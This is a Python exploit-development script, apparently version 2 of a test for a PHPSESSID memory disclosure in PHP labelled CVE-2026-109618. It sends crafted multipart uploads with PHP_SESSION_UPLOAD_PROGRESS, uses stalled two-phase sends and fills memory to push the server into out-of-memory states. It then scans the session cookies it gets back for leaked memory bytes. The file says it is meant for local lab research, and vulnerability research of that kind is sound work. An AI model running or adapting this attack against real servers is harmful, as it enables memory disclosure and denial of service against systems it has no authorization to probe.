#!/usr/bin/env python3
"""
CVE-2026-109618 -- PHPSESSID memory disclosure test v2

The v1 test failed because OOM hit during early field registration (69632B
allocation) before the session layer activated. This version uses a
different strategy: few fields that keep memory just below the limit,
combined with a file upload that triggers the session progress handler.
The progress handler's own allocations (session_initialize, deserialize,
hash operations) should be what pushes memory over the limit.

Also tests: does the session actually start and set a cookie when upload
progress is active WITHOUT OOM? We need to confirm the baseline first.

For authorized security research and local lab use only.
"""

import socket
import sys
import time


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def send_raw(host, port, raw_request, timeout=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(raw_request)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return f"ERROR: {e}".encode()


def send_twophase(host, port, seg1, seg2, stall, timeout=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(seg1)
        time.sleep(stall)
        sock.sendall(seg2)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return f"ERROR: {e}".encode()


def analyze(resp, label):
    if not resp or resp.startswith(b"ERROR:"):
        print(f"  [{label}] {resp.decode('latin-1', 'replace')[:200]}")
        return

    status_line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    header_end = resp.find(b"\r\n\r\n")
    raw_headers = resp[:header_end] if header_end > 0 else resp
    raw_body = resp[header_end + 4:] if header_end > 0 else b""

    oom = b"Allowed memory size" in raw_body
    oom_detail = ""
    if oom:
        idx = raw_body.find(b"Allowed memory size")
        oom_detail = raw_body[idx:idx + 200].decode("latin-1", "replace")

    # Find ALL Set-Cookie
    cookies = []
    for line in raw_headers.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            cookies.append(line)

    print(f"  [{label}] {status_line} | body={len(raw_body)}B | "
          f"oom={oom} | cookies={len(cookies)}")

    if oom and oom_detail:
        # Extract the allocation size that triggered OOM
        print(f"    OOM: {oom_detail[:120]}")

    for c in cookies:
        cv = c.split(b":", 1)[1].strip()
        print(f"    Cookie: {cv[:200].decode('latin-1', 'replace')}")
        if b"PHPSESSID=" in c:
            sessid = c.split(b"PHPSESSID=")[1].split(b";")[0]
            slen = len(sessid)
            non_alnum = sum(1 for b in sessid if b not in
                           b"abcdefghijklmnopqrstuvwxyz0123456789,-")
            has_binary = any(b < 0x20 or b > 0x7e for b in sessid)
            if slen > 40 or non_alnum > 0 or has_binary:
                print(f"    *** ANOMALOUS PHPSESSID len={slen} "
                      f"non_alnum={non_alnum} binary={has_binary} ***")
                print(f"    Hex: {sessid[:100].hex()}")
            else:
                print(f"    PHPSESSID normal: {sessid.decode('latin-1')}")
    print()


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    boundary = b"php2shell618"

    print("=" * 60)
    print("PHPSESSID Memory Disclosure Test v2")
    print("=" * 60)
    print(f"Target: http://{host}:{port}{path}")
    print()

    # -------------------------------------------------------
    # Test A: Does upload progress set a PHPSESSID cookie at all?
    # (No OOM, just a normal upload with progress tracking)
    # -------------------------------------------------------
    print("[A] Baseline: upload progress WITHOUT OOM")
    body = b""
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"baseline") + b"\r\n"
    body += make_part(boundary, "f", b"A" * 8192, filename="test.bin") + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Cookie: PHPSESSID=cookie-baseline-test\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp = send_raw(host, port, headers + body)
    analyze(resp, "baseline")

    # Also test WITHOUT a pre-set PHPSESSID cookie
    print("[A2] Baseline: upload progress, NO PHPSESSID cookie sent")
    headers2 = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    resp = send_raw(host, port, headers2 + body)
    analyze(resp, "no-cookie")

    # -------------------------------------------------------
    # Test B: Two-phase with gradual memory fill
    # Fill memory with file data (not form fields), then trigger
    # the progress update. File data doesn't register variables
    # so it shouldn't OOM during field registration.
    # -------------------------------------------------------
    print("[B] Two-phase: file data fills memory, progress update triggers OOM")
    # memory_limit is 16M = 16777216. PHP overhead ~2-3M.
    # We want to fill ~13M with file data, leaving ~1M for the
    # progress handler's allocations to push over.
    for fill_mb in [10, 12, 13, 14, 15]:
        sid = f"fileprefill-{fill_mb}m"
        fill_size = fill_mb * 1024 * 1024

        seg1 = b""
        seg1 += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS",
                          b"fill_test") + b"\r\n"
        # Start file upload with a LOT of data
        seg1 += make_part(boundary, "f", b"", filename="big.bin") + b"\r\n"
        seg1 += b"A" * fill_size

        # After stall, send a small continuation to trigger second update
        seg2 = b""
        seg2 += b"B" * 4096 + b"\r\n"
        seg2 += b"--" + boundary + b"--\r\n"

        total = len(seg1) + len(seg2)
        req_headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; "
            f"boundary={boundary.decode()}\r\n"
            f"Content-Length: {total}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        resp = send_twophase(host, port, req_headers + seg1, seg2,
                             stall=1.5, timeout=60)
        analyze(resp, f"fill-{fill_mb}M")

    # -------------------------------------------------------
    # Test C: Small fields to precisely fill memory
    # Use small fields (1K each) so we can get closer to the
    # limit without the 69632B allocation jumping over it.
    # -------------------------------------------------------
    print("[C] Precise fill: many 1KB fields + file upload")
    # 16M limit, ~3M overhead. Need ~13000 x 1K fields.
    # But each field also has multipart headers (~100B) and
    # registers a variable (~200B overhead). So maybe ~10000.
    for count in [8000, 10000, 12000, 13000]:
        sid = f"smallfill-{count}"
        body = b""
        body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS",
                          b"precise") + b"\r\n"
        for i in range(count):
            body += make_part(boundary, f"p{i}", b"Z" * 1024) + b"\r\n"
        body += make_part(boundary, "f", b"D" * 1024,
                          filename="test.bin") + b"\r\n"
        body += b"--" + boundary + b"--\r\n"

        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; "
            f"boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        resp = send_raw(host, port, headers + body, timeout=120)
        analyze(resp, f"small-{count}")

    print("Done.")


if __name__ == "__main__":
    main()
